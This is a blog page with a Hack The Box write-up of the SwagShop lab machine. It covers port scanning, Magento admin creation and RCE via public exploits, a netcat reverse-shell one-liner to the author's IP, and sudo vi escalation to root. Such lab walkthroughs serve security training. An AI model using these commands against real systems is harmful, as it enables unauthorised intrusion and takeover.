@@ -1,0 +1,600 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Swagshop - Hack The Box - hackcommander.io</title>
+<meta name="description" content="SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Swagshop - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-swagshop/">
+
+
+  <meta property="og:description" content="SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-swagshop/swagshop_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-09-28T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-swagshop/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Swagshop - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Swagshop - Hack The Box">
+    <meta itemprop="description" content="SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.">
+    <meta itemprop="datePublished" content="September 28, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Swagshop - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-09-28T00:00:00+02:00">September 28, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-swagshop/swagshop_logo.png" alt="" /></p>
+
+<p>SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>A Vulnerable Magento CMS 1.9.0 instance is running and we can use a CVE to create an admin account</li>
+  <li>We then use another exploit to get RCE and a shell on the box</li>
+  <li><code class="language-plaintext highlighter-rouge">vi</code> is in the sudoers file for www-data and we can execute a shell as root from withing <code class="language-plaintext highlighter-rouge">vi</code> with <code class="language-plaintext highlighter-rouge">:!/bin/sh</code></li>
+</ul>
+
+<h2 id="toolsblogs-used">Tools/Blogs used</h2>
+
+<ul>
+  <li>Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution</li>
+  <li>Magento eCommerce - Remote Code Execution</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="portscan">Portscan</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.140
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 20:52 EDT
+Nmap scan report for swagshop.htb (10.10.10.140)
+Host is up (0.011s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Did not follow redirect to http://10.10.10.140/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="website-enumeration">Website enumeration</h3>
+
+<p>The website is running the Magento CMS:</p>
+
+<p><img src="/assets/images/htb-writeup-swagshop/webpage.png" alt="" /></p>
+
+<p>Gobuster finds the directories associated with Magento:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.140
+/app (Status: 301)
+/downloader (Status: 301)
+/errors (Status: 301)
+/favicon.ico (Status: 200)
+/includes (Status: 301)
+/js (Status: 301)
+/lib (Status: 301)
+/media (Status: 301)
+/pkginfo (Status: 301)
+/server-status (Status: 403)
+/shell (Status: 301)
+/skin (Status: 301)
+/var (Status: 301)
+=====================================================
+2019/05/11 20:57:10 Finished
+=====================================================
+</code></pre></div></div>
+
+<p>Indexing is on for those directories:</p>
+
+<p><img src="/assets/images/htb-writeup-swagshop/indexing.png" alt="" /></p>
+
+<p>I have access to <code class="language-plaintext highlighter-rouge">/app/etc/local.xml</code> which contains the encrypted database password and the encryption key.</p>
+
+<p><img src="/assets/images/htb-writeup-swagshop/local.png" alt="" /></p>
+
+<p>I could not find any public tool to decrypt the password and because this is a 20 pts box there’s probably some generic CVE exploit online that I can use.</p>
+
+<h3 id="getting-a-shell">Getting a shell</h3>
+
+<p>A quick look with <code class="language-plaintext highlighter-rouge">searchsploit magento</code> shows the two interesting exploits:</p>
+
+<ul>
+  <li>Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution</li>
+  <li>Magento eCommerce - Remote Code Execution</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">Magento eCommerce - Remote Code Execution</code> exploit creates a new admin account with <code class="language-plaintext highlighter-rouge">forme/forme</code> as credentials. I just need to modify the target and the exploit and launch it to get an admin account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python 37997.py
+WORKED
+Check http://10.10.10.140/index.php/admin with creds form
+</code></pre></div></div>
+
+<p>I can now log in to the admin panel:</p>
+
+<p><img src="/assets/images/htb-writeup-swagshop/admin1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-swagshop/admin2.png" alt="" /></p>
+
+<p>I’ll use the other exploit <code class="language-plaintext highlighter-rouge">Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution</code> to gain remote code execution. I need to change the <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code>, and <code class="language-plaintext highlighter-rouge">install_date</code> parameters. The <code class="language-plaintext highlighter-rouge">install_data</code> is in the <code class="language-plaintext highlighter-rouge">local.xml</code> I found earlier.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username = 'forme'
+password = 'forme'
+php_function = 'system'  # Note: we can only pass 1 argument to the function
+install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
+</code></pre></div></div>
+
+<p>Launching exploit to spawn a reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 37811.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 9999 &gt;/tmp/f"
+
+# nc -lvnp 9999
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+Ncat: Connection from 10.10.10.140.
+Ncat: Connection from 10.10.10.140:44376.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ cd /home
+$ ls
+haris
+$ cat haris/user.txt
+a44887...
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>The privesc is obvious: The <code class="language-plaintext highlighter-rouge">www-data</code> user can execute <code class="language-plaintext highlighter-rouge">vi</code> as root. I know I can spawn a shell from within <code class="language-plaintext highlighter-rouge">vi</code> with <code class="language-plaintext highlighter-rouge">:!/bin/sh</code> and it’ll run as root because of sudo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@swagshop:/home$ sudo /usr/bin/vi /var/www/html/pwn -c ':!/bin/sh'
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+c2b087...
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+#
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#magento" class="page__taxonomy-item" rel="tag">magento</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sudo" class="page__taxonomy-item" rel="tag">sudo</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#vi" class="page__taxonomy-item" rel="tag">vi</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-09-28T00:00:00+02:00">September 28, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-kryptos/" class="pagination--pager" title="Kryptos - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-ghoul/" class="pagination--pager" title="Ghoul - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
